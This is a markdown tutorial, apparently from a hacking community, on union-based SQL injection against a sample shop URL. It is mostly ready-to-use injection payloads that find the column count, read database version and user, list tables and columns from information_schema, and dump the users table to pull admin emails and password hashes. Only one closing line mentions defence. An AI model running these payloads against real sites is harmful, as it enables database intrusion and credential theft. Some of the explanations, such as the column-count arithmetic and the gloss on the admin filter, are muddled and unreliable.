# Simple SQL injection example


1 - Find a vulnerbale URL: `example.com/shop.php?item=3'`
	You are looking for an error.

2 - Use `order by X` in the URL to get the injection points: `example.com/shop.php?item=3 order by 100 --`

3 - Go up and down to get the table count: `example.com/shop.php?item=3 order by 10 --`

  We're looking for an "unknown column count" error, but it will still show a correct layout when we get the right number.
	We get the final URL (last number with an error): `example.com/shop.php?item=3 order by 7 --`
  
  Then minus 1 which gives us 6 (because it starts at 0, not 1)
	
4 - Now we add the `union all select` statement to get the attack vectors:

```example.com/shop.php?item=-3 union all select 1,2,3,4,5,6 --```

Some content on the page will be replaced with a number above. We'll inject our code into that number.
	
5 - The next step is to start gathering information about the server / site setup. 
  We will assume there is only one injection point here, so test them seperatly: ```example.com/shop.php?item=-3 union all select 1, version() ,3,4,5,6 --```
  
and: ```example.com/shop.php?item=-3 union all select 1, user() ,3,4,5,6 --```

Neither are a great hit so we'll carry on enumeration...
	
6 - Now we need to know the names of the tables to proceed by using the `group_concat` statement:

```example.com/shop.php?item=-3 union all select 1, group_concat(table_name) ,3,4,5,6  from information_schema.tables where table_schema=database() --```
  
  This simply says: "gimme the concatenated table_names from the tables list". The table names will be shown where the injectednumber was. Click three times to highlight the entire string and paste it into notepad so you can search for useful fields.
  
  Both the `users` and `Login` tables look interesting...
	
  Note: table / row / column names are case-sensitive!
	
7 - So let's try to get the `users` table with a similar URL:

```example.com/shop.php?item=-3 union all select 1, group_concat(column_name) ,3,4,5,6  from information_schema.columns where table_name = 0x7573657273 --```

We just change table to column and change table_schema to `table_name = 0x("users" in hex)`.

The page should now show the columns for the `users` table. The rows are the actual users info... username, email, password, etc.

Again, copy and paste to notepad to make searching easier.
	
These columns look interesting:

```ID,Email,Password,admin```
	
8 - So let's see what's in the above fields with a similar statement to the previous two:
	
```example.com/shop.php?item=-3 union all select 1, group_concat(ID,0x3a,Email,0x3a,Password,0x3a,admin) ,3,4,5,6 from users --```
	
`0x3a` will be replaced with `:` to help separating the data easier. 

We also replced the `from information_schema` junk with just `from tablename`
	
This will return a lot of data but we can filter it further to find an admin login...
	
9 - Finding an admin account is always preferred, so we can start filtering using a "where" statement...

```example.com/shop.php?item=-3 union all select 1, group_concat(ID,0x3a,Email,0x3a,Password,0x3a,admin) ,3,4,5,6  from users where admin <> '' --```

Suffixing `where admin <> ''` means "show me all rows where admin permissions isn't under or over anything"... < means under, > means over and '' being a blank value.
	
10 - Tada. Copy and paste the account info into notepad and see what we got...

	113:diane@example.com:13c910179746854acd8c4dbedfc3610f:Y
	or
	ID: 113
	Email: diane@example.com
	Password: 13c910179746854acd8c4dbedfc3610f
	admin: Y (yes, I'm an admin account)
	
Not all hashes are easy to crack or even valid (it could be salted or use a hidden concatenated value). Most of the users on this site have easy to crack passwords but not the admin

Sometimes the MD5 hash will also work as the password, but not always.

Preventing SQL injection attacks is fairly simple. All user data should be sanitized and never assumed to be clean!

## Thanks
That was a quick and dirty guide to SQL injection. It's a very old technique, not new, and mostly patched. Hope you enjoyed it, and feel free to let me know what you think...

## Social

[Hackersploit Discord](https://discord.gg/hackersploit)
